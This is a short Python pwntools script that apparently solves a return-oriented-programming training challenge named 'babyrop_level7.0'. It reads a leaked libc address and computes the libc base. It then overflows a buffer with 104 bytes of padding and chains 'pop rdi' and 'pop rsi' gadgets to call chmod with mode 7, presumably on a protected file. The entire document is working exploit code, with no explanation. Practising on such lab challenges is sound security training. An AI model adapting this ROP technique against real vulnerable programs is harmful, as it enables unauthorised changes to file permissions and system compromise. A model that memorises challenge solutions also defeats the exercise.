from pwn import *

p = process("/challenge/babyrop_level7.0")

p.recvuntil('libc is: ')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

system = int(p.recv().decode()[:-3],16)
libc.address = system - libc.sym['system']
gadget1 = 0x401e73 # pop rdi; ret
gadget2 = 0x401e71 # pop rsi; ret
string = 0x40248a
payload = b"A"*104+p64(gadget1)+p64(string)+p64(gadget2)+p64(7)*2+p64(libc.sym['chmod'])

p.send(payload)

p.interactive()
